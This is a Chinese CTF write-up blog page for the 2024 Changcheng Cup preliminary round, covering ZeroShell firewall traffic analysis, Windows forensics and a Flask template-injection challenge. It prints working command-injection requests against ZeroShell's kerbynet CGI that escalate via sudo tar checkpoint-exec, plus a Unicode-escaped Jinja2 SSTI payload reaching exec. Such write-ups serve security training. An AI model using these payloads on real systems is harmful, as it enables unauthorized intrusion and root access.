@@ -1,0 +1,247 @@
+
+<!DOCTYPE html>
+<html lang="zh" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2024-12-17 长城杯初赛WP - 二月の档案室</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="二月,"> 
+    <meta name="description" content="所感所想，所言所行，我将以文字记录我自己。,威胁检测与网络流量分析zeroshell_1题目内容：
+小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常,"> 
+    <meta name="author" content="Allureluoli"> 
+    <link rel="alternative" href="atom.xml" title="二月の档案室" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="2024-12-17 长城杯初赛WP - 二月の档案室"/>
+    <meta name="twitter:description" content="所感所想，所言所行，我将以文字记录我自己。,威胁检测与网络流量分析zeroshell_1题目内容：
+小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="二月の档案室"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="2024-12-17 长城杯初赛WP - 二月の档案室"/>
+    <meta property="og:description" content="所感所想，所言所行，我将以文字记录我自己。,威胁检测与网络流量分析zeroshell_1题目内容：
+小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">二月の档案室</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://blog.curesky.site"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2024-12-17 长城杯初赛WP</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2024-12-17 长城杯初赛WP</h1>
+        <div class="stuff">
+            <span>十二月 17, 2024</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a>威胁检测与网络流量分析</h2><h3 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h3><p>题目内容：</p>
+<p>小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常的设备。然后进行深度取证检查（需要获取root权限）。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放获取防火墙设备管理员权限，查找防火墙设备上安装的木马，然后分析木马外联地址和通信密钥以及木马启动项位置。</p>
+<p>1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}</p>
+<p>（本题附件见于提前下载的加密附件2e9c01da1d333cb8840968689ed3bc57.7z，解压密码为11b0526b-9cfb-4ac4-8a75-10ad9097b7ce ）</p>
+<ol>
+<li>解压附件</li>
+</ol>
+<p>解压后是一个vmk的虚拟机内容和一个流量包，其他文件夹是空的</p>
+<p>先运行vmk ps: 需要17以上版本，而我准备的vm是16版本的，所以花了些时间重装</p>
+<p>把虚拟机跑起来</p>
+<p>题目已提示</p>
+<p><code>分析会话编写exp或数据包重放获取防火墙设备管理员权限</code></p>
+<p>多半是数据包重放攻击</p>
+<p>整理好思路开始查看</p>
+<p>ps: 太累了不放图了</p>
+<p>wireshark过滤内容</p>
+<p>http </p>
+<p>然后搜索字符串 搜那个登录的 action键的值</p>
+<p>搜到了账号密码 admin qwe!@..</p>
+<p>试了很多次无法登录</p>
+<p>这是个误导人的信息</p>
+<p>后面对cgi接口进行测试</p>
+<p>在http请求数据包中找到了一串base64</p>
+<p>这个既是答案也是下一题的线索</p>
+<hr>
+<h3 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h3><p>2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容</p>
+<p>看到这个就该想到webshell了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>find / -name “flag”<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>经过测试发现传参漏洞</p>
+<p>先经过find命令找到flag文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>find / -name “flag”<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>直接cat 拿到flag</p>
+<hr>
+<h3 id="zeroshell-3"><a href="#zeroshell-3" class="headerlink" title="zeroshell_3"></a>zeroshell_3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>netstat -ano<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>找到IP就行了</p>
+<p>没截图别看了</p>
+<h3 id="zeroshell-5"><a href="#zeroshell-5" class="headerlink" title="zeroshell_5"></a>zeroshell_5</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=<span class="built_in">exec</span>=%27cat%20/DB/_DB.001/.nginx %27%0A%27%20%20HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>应该没打错吧</p>
+<p>把木马文件内容提取出来</p>
+<p>hxd打开查看字段找到密码311223344qweasdzxc</p>
+<h3 id="win1"><a href="#win1" class="headerlink" title="win1"></a>win1</h3><p>运行虚拟机查看属性</p>
+<p>送分题</p>
+<h3 id="win2"><a href="#win2" class="headerlink" title="win2"></a>win2</h3><p>翻日志的时候 查看了一下计划任务找到密码</p>
+<p>很明显的base64编码</p>
+<p>解码成html实体编码</p>
+<p>就这</p>
+<p>最后解码成flag</p>
+<h3 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h3><p>阅读源码发现是我熟悉的flask 框架</p>
+<p>过滤内容太多了</p>
+<p>但是没有过滤	Unicode 转义</p>
+<p>代码尝试通过递归访问字典的多个层级来最终获取到 <code>exec</code> 函数</p>
+<p>最后exec执行命令即可</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;cycler[<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;(\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f)(&#x27;\u006f\u0073&#x27;).\u0070\u006f\u0070\u0065\u006e(&#x27;cat /flag &gt; app.py&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ps:思路： 内建字典中获取到 <code>exec</code> 函数，利用该函数执行一个命令行操作</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://blog.curesky.site/audio/yinlang.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="10a7f71656553fd4676c"
+        data-cs="48f8d183288b4d0b2531f047719dee43bdc913ec"
+        data-r="allureluoli.github.io"
+        data-o="allureluoli"
+        data-a="allureluoli"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">威胁检测与网络流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-1"><span class="toc-number">1.1.</span> <span class="toc-text">zeroshell_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-2"><span class="toc-number">1.2.</span> <span class="toc-text">zeroshell_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-3"><span class="toc-number">1.3.</span> <span class="toc-text">zeroshell_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-5"><span class="toc-number">1.4.</span> <span class="toc-text">zeroshell_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win1"><span class="toc-number">1.5.</span> <span class="toc-text">win1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win2"><span class="toc-number">1.6.</span> <span class="toc-text">win2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Safe-Proxy"><span class="toc-number">1.7.</span> <span class="toc-text">Safe_Proxy</span></a></li></ol></li></ol>
+        </div>
+    
+</div>
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
